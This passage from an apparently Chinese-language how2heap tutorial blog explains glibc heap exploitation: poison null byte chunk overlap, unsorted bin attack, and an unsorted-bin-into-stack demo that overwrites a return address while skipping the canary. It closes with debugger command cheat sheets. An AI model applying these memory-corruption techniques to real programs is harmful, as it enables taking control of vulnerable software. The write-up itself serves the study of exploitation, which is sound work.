cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">*(<span class="hljs-keyword">size_t</span>*)(b+<span class="hljs-number">0x1f0</span>) = <span class="hljs-number">0x200</span>;<br></code></pre></td></tr></table></figure><p>这一步确保了我们之后进行 null byte 溢出后，还能成功 free(b)，逃过** ‘chunksize(P) != prev_size (next_chunk(P))’** 的检查。<br>之后分配 b1 和 b2 的时候，presize 也会一直在(b+0x1f0)处更新。<br>而在最后 free(c)的时候，检查的是 c 的 presize 位，而因为最开始的 null byte 溢出，导致这块区域的值一直没被更新，一直是 b 最开始的大小 0x210 。<br>我们知道，两个相邻的 small chunk 被释放后会被合并在一起。首先释放 chunk b1，伪造出 fake chunk b 是 free chunk 的样子。然后释放 chunk c，因为 chunk c 的 prevsize 没有变化，这个时候 chunk c 会认为 chunk b1 就是 chunk b，这时程序会发现 chunk c 的前一个 chunk 是一个 free chunk，然后就将它们合并在了一起，并从 unsorted bin 中取出来合并进了 top chunk。 chunk b2 位于 chunk b1 和 chunk c 之间，被直接无视了，现在 malloc 认为这整块区域都是未分配的。</p><blockquote><p>补充：</p></blockquote><p>chunk 合并的过程如下，首先该 chunk 与前一个 chunk 合并，然后检查下一个 chunk 是否为 top chunk，如果不是，将合并后的 chunk 放回 unsorted bin 中，否则，合并进 top chunk：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs cpp">  <span class="hljs-comment">/* consolidate backward */</span><br>  <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>    prevsize = p-&gt;prev_size;<br>    size += prevsize;<br>    p = chunk_at_offset(p, -((<span class="hljs-keyword">long</span>) prevsize));<br>    unlink(av, p, bck, fwd);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123;<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">Place the chunk in unsorted chunk list. Chunks are</span><br><span class="hljs-comment">not placed into regular bins until after they have</span><br><span class="hljs-comment">been given one chance to be used in malloc.</span><br><span class="hljs-comment">  */</span><br>    [...]<br>  &#125;<br><br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">    If the chunk borders the current high end of memory,</span><br><span class="hljs-comment">    consolidate into top</span><br><span class="hljs-comment">  */</span><br><br>  <span class="hljs-keyword">else</span> &#123;<br>    size += nextsize;<br>    set_head(p, size | PREV_INUSE);<br>    av-&gt;top = p;<br>    check_chunk(av, p);<br>  &#125;<br></code></pre></td></tr></table></figure><p>d = malloc(0x300);之后<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-79.png#clientId=u347f053a-7aac-4&from=paste&height=292&id=u8ac32d1f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=584&originWidth=856&originalType=binary&size=322110&status=done&style=none&taskId=u180d0ab4-b269-41a1-82ba-b7916de8294&width=428" alt="image.png"><br>返回的地址还是原来 b 的地址（0x8008120-0x10)，刚才没有 free 的 b2 也被包含在了里面<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-80.png#clientId=u347f053a-7aac-4&from=paste&height=221&id=u0df4b579&margin=%5Bobject%20Object%5D&name=image.png&originHeight=441&originWidth=728&originalType=binary&size=273747&status=done&style=none&taskId=ue4446f69-2c7e-4ee8-84e6-a39289eafa7&width=364" alt="image.png"><br>查看 b2 内容<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-81.png#clientId=u347f053a-7aac-4&from=paste&height=402&id=u2001de99&margin=%5Bobject%20Object%5D&name=image.png&originHeight=803&originWidth=1817&originalType=binary&size=1146578&status=done&style=none&taskId=u0b17fedc-0d1f-4bbb-84a2-a65830e45a9&width=908.5" alt="image.png"><br>该技术适用的场景需要某个 malloc 的内存区域存在一个单字节溢出漏洞。通过溢出下一个 chunk 的 size 字段，攻击者能够在堆中创造出重叠的内存块，从而达到改写其他数据的目的。再结合其他的利用方式，同样能够获得程序的控制权。<br>对于单字节溢出的利用有下面几种：</p><ul><li>扩展被释放块：当溢出块的下一块为被释放块且处于 unsorted bin 中，则通过溢出一个字节来将其大小扩大，下次取得次块时就意味着其后的块将被覆盖而造成进一步的溢出。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp">  <span class="hljs-number">0x100</span>   <span class="hljs-number">0x100</span>    <span class="hljs-number">0x80</span><br>|-------|-------|-------|<br>|   A   |   B   |   C   |   初始状态<br>|-------|-------|-------|<br>|   A   |   B   |   C   |   释放 B<br>|-------|-------|-------|<br>|   A   |   B   |   C   |   溢出 B 的 size 为 <span class="hljs-number">0x180</span><br>|-------|-------|-------|<br>|   A   |   B   |   C   |   <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x180</span><span class="hljs-number">-8</span>)<br>|-------|-------|-------|   C 块被覆盖<br>        |&lt;--实际得到的块-&gt;|<br></code></pre></td></tr></table></figure><ul><li>扩展已分配块：当溢出块的下一块为使用中的块，则需要合理控制溢出的字节，使其被释放时的合并操作能够顺利进行，例如直接加上下一块的大小使其完全被覆盖。下一次分配对应大小时，即可取得已经被扩大的块，并造成进一步溢出。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp">  <span class="hljs-number">0x100</span>   <span class="hljs-number">0x100</span>    <span class="hljs-number">0x80</span><br>|-------|-------|-------|<br>|   A   |   B   |   C   |   初始状态<br>|-------|-------|-------|<br>|   A   |   B   |   C   |   溢出 B 的 size 为 <span class="hljs-number">0x180</span><br>|-------|-------|-------|<br>|   A   |   B   |   C   |   释放 B<br>|-------|-------|-------|<br>|   A   |   B   |   C   |   <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x180</span><span class="hljs-number">-8</span>)<br>|-------|-------|-------|   C 块被覆盖<br>        |&lt;--实际得到的块-&gt;|<br></code></pre></td></tr></table></figure><ul><li>收缩被释放块(即本题)：此情况针对溢出的字节只能为 0 的时候，也就是本节所说的 poison-null-byte，此时将下一个被释放的块大小缩小，如此一来在之后分裂此块时将无法正确更新后一块的 prev_size 字段，导致释放时出现重叠的堆块。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp">  <span class="hljs-number">0x100</span>     <span class="hljs-number">0x210</span>     <span class="hljs-number">0x80</span><br>|-------|---------------|-------|<br>|   A   |       B       |   C   |   初始状态<br>|-------|---------------|-------|<br>|   A   |       B       |   C   |   释放 B<br>|-------|---------------|-------|<br>|   A   |       B       |   C   |   溢出 B 的 size 为 <span class="hljs-number">0x200</span><br>|-------|---------------|-------|   之后的 <span class="hljs-built_in">malloc</span> 操作没有更新 C 的 prev_size<br>         <span class="hljs-number">0x100</span>  <span class="hljs-number">0x80</span><br>|-------|------|-----|--|-------|<br>|   A   |  B1  | B2  |  |   C   |   <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x180</span><span class="hljs-number">-8</span>), <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span><span class="hljs-number">-8</span>)<br>|-------|------|-----|--|-------|<br>|   A   |  B1  | B2  |  |   C   |   释放 B1<br>|-------|------|-----|--|-------|<br>|   A   |  B1  | B2  |  |   C   |   释放 C，C 将与 B1 合并<br>|-------|------|-----|--|-------|<br>|   A   |  B1  | B2  |  |   C   |   <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x180</span><span class="hljs-number">-8</span>)<br>|-------|------|-----|--|-------|   B2 将被覆盖<br>        |&lt;实际得到的块&gt;|<br></code></pre></td></tr></table></figure><h1 id="unsorted-bin-attack-2-23"><a href="#unsorted-bin-attack-2-23" class="headerlink" title="unsorted_bin_attack-2.23"></a>unsorted_bin_attack-2.23</h1><p>这个例程通过 unsortedbin 攻击往栈中写入一个 unsigned long 的值。<br>在实战中，unsorted bin 攻击通常是为更进一步的攻击做准备的。<br>比如，我们在栈上有一个栈单元 stack_var 需要被改写<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-82.png#clientId=u347f053a-7aac-4&from=paste&height=363&id=u7d59295c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=725&originWidth=1261&originalType=binary&size=1096913&status=done&style=none&taskId=u89bded64-5af6-47f4-924f-79af335cdee&width=630.5" alt="image.png"><br>然后正常地分配一个 chunk。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-83.png#clientId=u347f053a-7aac-4&from=paste&height=382&id=u2ffbb479&margin=%5Bobject%20Object%5D&name=image.png&originHeight=763&originWidth=1317&originalType=binary&size=1001146&status=done&style=none&taskId=u9f9e017f-e53d-45c3-8392-e81c850ad3d&width=658.5" alt="image.png"><br>再分配一个，防止前一个 chunk 在 free 的时候被合并了。<br>然后 free(p);之后 p 会被插入到 unsortedbin 链表中，它的 fd 和 bk 都指向 unsortedbin 的 head。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-84.png#clientId=u347f053a-7aac-4&from=paste&height=411&id=ue0445c3d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=821&originWidth=1273&originalType=binary&size=926264&status=done&style=none&taskId=u78523055-0f89-49a0-b52c-064720e5b68&width=636.5" alt="image.png"><br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-85.png#clientId=u347f053a-7aac-4&from=paste&height=203&id=u2f7a2bd4&margin=%5Bobject%20Object%5D&name=image.png&originHeight=405&originWidth=700&originalType=binary&size=169863&status=done&style=none&taskId=ub7295ae7-dad7-4660-93cc-0a102a030ea&width=350" alt="image.png"><br>接着我们模拟一个漏洞攻击改写 p 的 bk 指针：<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-86.png#clientId=u347f053a-7aac-4&from=paste&height=311&id=u9296eb09&margin=%5Bobject%20Object%5D&name=image.png&originHeight=622&originWidth=1428&originalType=binary&size=739966&status=done&style=none&taskId=udf20161b-ffa2-4891-a78c-e634bd5c40b&width=714" alt="image.png"><br>然后 malloc<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-87.png#clientId=u347f053a-7aac-4&from=paste&height=424&id=ua20c418c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=848&originWidth=1326&originalType=binary&size=997797&status=done&style=none&taskId=u32fd2ae3-917b-48d2-b75f-4af6bd9b269&width=663" alt="image.png"><br>然后<strong>stack_var</strong>的值就被改写成了 unsortedbin 的 head 的地址了。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-88.png#clientId=u347f053a-7aac-4&from=paste&height=31&id=uf7fabbe9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=61&originWidth=461&originalType=binary&size=19308&status=done&style=none&taskId=uff3920b9-bf5d-41e3-acc8-d4bdc28317d&width=230.5" alt="image.png"><br>之前的 unsafe_unlink 是通过 unlink 来直接控制地址，这里则是通过 unlink 来泄漏 libc 的信息，来进行进一步的攻击。<br>可以参考这一篇：<a href="https://zoepla.github.io/2018/05/how2heap%E7%B3%BB%E5%88%97(%E5%9F%BA%E7%A1%80%E7%AF%87)/">Pwn 的挖坑填坑之旅</a><br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-89.png#clientId=u347f053a-7aac-4&from=paste&height=114&id=ufc44a364&margin=%5Bobject%20Object%5D&name=image.png&originHeight=227&originWidth=1230&originalType=binary&size=36359&status=done&style=none&taskId=u3dba95ad-3e7f-4983-9930-9ec41b88f5d&width=615" alt="image.png"></p><h1 id="unsorted-bin-into-stack-2-23"><a href="#unsorted-bin-into-stack-2-23" class="headerlink" title="unsorted_bin_into_stack-2.23"></a>unsorted_bin_into_stack-2.23</h1><p>例子源码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">jackpot</span><span class="hljs-params">()</span></span>&#123; <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Nice jump d00d\n&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">intptr_t</span> stack_buffer[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocating the victim chunk\n&quot;</span>);<br>        <span class="hljs-keyword">intptr_t</span>* victim = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n&quot;</span>);<br>        <span class="hljs-keyword">intptr_t</span>* p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);<br>        <span class="hljs-built_in">free</span>(victim);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Create a fake chunk on the stack&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Set size for next allocation and the bk pointer to any writable address&quot;</span>);<br>        stack_buffer[<span class="hljs-number">1</span>] = <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>;<br>        stack_buffer[<span class="hljs-number">3</span>] = (<span class="hljs-keyword">intptr_t</span>)stack_buffer;<br><br>        <span class="hljs-comment">//------------VULNERABILITY-----------</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointer\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Size should be different from the next request size to return fake_chunk and need to pass the check 2*S</span><br><span class="hljs-string">IZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem\n&quot;</span>);<br>        victim[<span class="hljs-number">-1</span>] = <span class="hljs-number">32</span>;<br>        victim[<span class="hljs-number">1</span>] = (<span class="hljs-keyword">intptr_t</span>)stack_buffer; <span class="hljs-comment">// victim-&gt;bk is pointing to stack</span><br>        <span class="hljs-comment">//------------------------------------</span><br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now next malloc will return the region of our fake chunk: %p\n&quot;</span>, &amp;stack_buffer[<span class="hljs-number">2</span>]);<br>        <span class="hljs-keyword">char</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc(0x100): %p\n&quot;</span>, p2);<br><br>        <span class="hljs-keyword">intptr_t</span> sc = (<span class="hljs-keyword">intptr_t</span>)jackpot; <span class="hljs-comment">// Emulating our in-memory shellcode</span><br>        <span class="hljs-built_in">memcpy</span>((p2+<span class="hljs-number">40</span>), ≻, <span class="hljs-number">8</span>); <span class="hljs-comment">// This bypasses stack-smash detection since it jumps over the canary</span><br><br>        assert((<span class="hljs-keyword">long</span>)__builtin_return_address(<span class="hljs-number">0</span>) == (<span class="hljs-keyword">long</span>)jackpot);<br>&#125;<br></code></pre></td></tr></table></figure><p>本题 unsorted-bin-into-stack 通过改写 unsorted bin 里 chunk 的 bk 指针到任意地址，从而在栈上 malloc 出 chunk。<br>初始栈<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-90.png#clientId=u38185df4-f4d6-4&from=paste&height=169&id=u10f80e0e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=244&originWidth=857&originalType=binary&size=239052&status=done&style=none&taskId=u384c129f-04ad-4a88-b95e-d38c2445330&width=593.5" alt="image.png"><br>先 malloc 一个 victim 块<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-91.png#clientId=u38185df4-f4d6-4&from=paste&height=168&id=u4ef9ac2b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=336&originWidth=561&originalType=binary&size=171711&status=done&style=none&taskId=ucc095613-3559-47fc-acbe-4799fd59cbb&width=280.5" alt="image.png"><br>再分配一个防止 free 的时候和 top chunk 合并。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-92.png#clientId=u38185df4-f4d6-4&from=paste&height=219&id=u593caa2a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=437&originWidth=739&originalType=binary&size=274303&status=done&style=none&taskId=u3d672eb4-d629-46c2-818c-6ed05935421&width=369.5" alt="image.png"><br>接下来释放 p<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-93.png#clientId=u38185df4-f4d6-4&from=paste&height=246&id=u8713a8b8&margin=%5Bobject%20Object%5D&name=image.png&originHeight=492&originWidth=630&originalType=binary&size=283418&status=done&style=none&taskId=ufc8a4875-9011-4a1b-90f7-f38cfbfc398&width=315" alt="image.png"><br>可以看到它插入了 unsorted bin 列表中<br>我们要在栈上构造一个 chunk，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">stack_buffer[<span class="hljs-number">1</span>] = <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>;<br>stack_buffer[<span class="hljs-number">3</span>] = (<span class="hljs-keyword">intptr_t</span>)stack_buffer;<br></code></pre></td></tr></table></figure><p>查看此时内存布局</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; x/<span class="hljs-number">6</span>gx victim - <span class="hljs-number">2</span><br><span class="hljs-number">0x8008010</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000111</span> &lt;-- victim chunk<br><span class="hljs-number">0x8008020</span>:      <span class="hljs-number">0x00007fffff3f3b78</span>      <span class="hljs-number">0x00007fffff3f3b78</span><br><span class="hljs-number">0x8008030</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><br>pwndbg&gt; x/<span class="hljs-number">4</span>gx stack_buffer<br><span class="hljs-number">0x7ffffffed9a0</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000110</span>  &lt;-- fake chunk<br><span class="hljs-number">0x7ffffffed9b0</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x00007ffffffed9a0</span><br></code></pre></td></tr></table></figure><p>然后假设有一个漏洞，可以改写 victim chunk 的 bk 指针，那么将其改为指向 fake chunk：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">victim[<span class="hljs-number">-1</span>] = <span class="hljs-number">32</span>;<br>victim[<span class="hljs-number">1</span>] = (<span class="hljs-keyword">intptr_t</span>)stack_buffer; <span class="hljs-comment">// victim-&gt;bk is pointing to stack</span><br></code></pre></td></tr></table></figure><p>这里的 size = 32，只要是一个合理的范围，比之后要申请的 chunk size 要小就行。然后我们把 victim-&gt;bk 的值赋为 stack_buffer</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; x/<span class="hljs-number">6</span>gx victim - <span class="hljs-number">2</span><br><span class="hljs-number">0x8008010</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000020</span>   &lt;-- victim chunk<br><span class="hljs-number">0x8008020</span>:      <span class="hljs-number">0x00007fffff3f3b78</span>      <span class="hljs-number">0x00007ffffffed9a0</span>   &lt;-- bk pointer<br><span class="hljs-number">0x8008030</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><p>那么此时就相当于 fake chunk 已经被链接到 unsorted bin 中。在下一次 malloc 的时候，malloc 会顺着 bk 指针进行遍历，于是就找到了大小正好合适的 fake chunk：<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-94.png#clientId=u38185df4-f4d6-4&from=paste&height=321&id=uc4f1b5a0&margin=%5Bobject%20Object%5D&name=image.png&originHeight=642&originWidth=1051&originalType=binary&size=657454&status=done&style=none&taskId=u3fca205b-d8a5-417e-96c2-cd41a462aa2&width=525.5" alt="image.png"><br>过程如下：<br>​</p><p>首先 victim chunk 被从 unsorted bin 中取出：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp">bck = victim-&gt;bk;<br><span class="hljs-comment">/* remove from unsorted list */</span><br>unsorted_chunks (av)-&gt;bk = bck;<br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure><p>显然这个 chunk 的大小是不够的，所以被放入 small bin 中。<br>现在再从 unsorted bin 拿出一个被构造的 fake chunk ，现在有了一些检查：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (__builtin_expect (chunksize_nomask (victim) &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>    || __builtin_expect (chunksize_nomask (victim)<br>                         &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br></code></pre></td></tr></table></figure><p>大小合理，轻松绕过。而另外值得注意的是 fake chunk 的 fd 指针被修改了，这是 unsorted bin 的地址，通过它可以泄露 libc 地址.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; x/<span class="hljs-number">6</span>gx victim - <span class="hljs-number">2</span><br><span class="hljs-number">0x8008010</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000020</span><br><span class="hljs-number">0x8008020</span>:      <span class="hljs-number">0x00007fffff3f3b88</span>      <span class="hljs-number">0x00007fffff3f3b88</span><br><span class="hljs-number">0x8008030</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="Pwngdb"><a href="#Pwngdb" class="headerlink" title="Pwngdb"></a>Pwngdb</h2><p>libc : Print the base address of libc<br>ld : Print the base address of ld<br>codebase : Print the base of code segment<br>heap : Print the base of heap<br>got : Print the Global Offset Table infomation<br>dyn : Print the Dynamic section infomation<br>findcall : Find some function call<br>bcall : Set the breakpoint at some function call<br>tls : Print the thread local storage address<br>at : Attach by process name<br>findsyscall : Find the syscall<br>force : Calculate the nb in the house of force.<br>heapinfo :打印 heap 的一些信息<br>heapinfoall : Print some infomation of heap (all threads)<br>arenainfo : Print some infomation of all arena<br>chunkptr : 打印 chunk 的信息 后面加 chunk 返回给用户的地址<br>printfastbin : 打印 fastbin 的链表信息<br>tracemalloc on : 追踪程序 chunk 的 malloc 和 free<br>parseheap :解析堆的布局<br>magic : 打印出 glibc 中一些有用的信息<br>fp : show FILE structure<br>fp (Address of FILE)</p><h2 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h2><p>top_chunk: 显示 top chunk 的信息<br>malloc_chunk address:打印出已被分配的 chunk 的信息<br>fastbins:显示 fastbins 链表信息<br>unsorted:显示 unsortedbin 的信息<br>smallbins:显示 smallbins 的信息<br>largebins:显示 largebins 的信息<br>bins:显示所有 bins 的信息<br>mp：显示一些内存管理用到的全局变量<br>arena：显示分配区的信息</p><h2 id="peda-基础命令"><a href="#peda-基础命令" class="headerlink" title="peda 基础命令"></a>peda 基础命令</h2><p>​</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs cpp">file 路径　-　附加文件<br><span class="hljs-keyword">break</span> *<span class="hljs-number">0x400100</span> (b main) - 在 <span class="hljs-number">0x400100</span> 处下断点<br>tb  - 一次性断点<br>info b - 查看断点信息<br>enable   -   激活断点<br>disable  -   禁用断点<br><span class="hljs-keyword">delete</span> [number]  -  删除断点<br>watch *(<span class="hljs-keyword">int</span> *)<span class="hljs-number">0x08044530</span>  -  在内存<span class="hljs-number">0x0804453</span>处的数据改变时stop<br>p $eax - 输出eax的内容<br><span class="hljs-built_in">set</span> $eax=<span class="hljs-number">4</span> - 修改变量值<br><br>c - 继续运行<br>r - 开始运行<br>ni - 单步步过<br>si - 单步步入<br>fini - 运行至函数刚结束处<br><span class="hljs-keyword">return</span> expression - 将函数返回值指定为expression<br>bt - 查看当前栈帧<br>info f - 查看当前栈帧<br>context - 查看运行上下文<br><span class="hljs-built_in">stack</span> - 查看当前堆栈<br>call func - 强制函数调用<br><span class="hljs-built_in">stack</span> <span class="hljs-number">100</span> - 插件提供的，显示栈中<span class="hljs-number">100</span>项<br>find xxx　 - 快速查找，很实用<br><br>x/&lt;n/f/u&gt; &lt;addr&gt;     n、f、u是可选的参数。<br>x /<span class="hljs-number">4</span>xg $ebp：查看ebp开始的<span class="hljs-number">4</span>个<span 